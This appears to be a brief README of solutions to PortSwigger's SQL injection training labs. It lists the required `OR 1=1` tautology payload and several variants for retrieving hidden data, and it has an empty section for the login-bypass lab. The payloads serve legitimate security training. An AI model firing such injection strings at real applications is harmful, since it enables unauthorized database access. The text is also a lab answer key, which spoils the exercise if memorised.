# SQL-injection
# Port Swigger SQL injection Lab Solutions <tag>

####Retrieving hidden data<tag>

[1.Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)


1. Solutions
   1. `'+OR+1=1--` -> Required
   >The server can also respond for the following
   1. `'OR+'1'='1--`
   1. `'OR+'1'='1'--`
   1. `'OR+'1'--`
   1. `'OR+true--`
   1. `'OR+'a'='a'--`
   1. `/OR+1=1--`
   1. `)'OR+1=1-- `
   1. `""OR+1=1--`
   1. `)*OR+1=1--`
   
####Subverting application logic<tag>

[2.Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

1. Solutions

  

